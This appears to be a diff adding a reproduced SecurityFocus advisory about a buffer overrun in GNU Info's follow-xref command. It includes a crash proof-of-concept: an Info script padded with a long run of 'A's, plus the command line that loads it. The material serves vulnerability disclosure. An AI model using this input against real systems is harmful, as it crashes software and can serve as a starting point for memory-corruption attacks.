@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/10882/info
+
+GNU Info is reported prone to a buffer overrun vulnerability. The vulnerability is reported to present itself due to a lack of boundary checks performed on argument data for the (f) follow xref Info command.
+
+An attacker may exploit this vulnerability by crafting a malicious Info script that is sufficient to trigger the issue.
+
+Although this vulnerability is reported to affect info version 4.7-2.1, other versions might also be affected.
+
+The following can be saved to a file and called as:
+info info --restore=info.bug to create a segmentation fault.
+
+[START info.bug]
+gExpert Info
+
+fAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+[END info.bug]
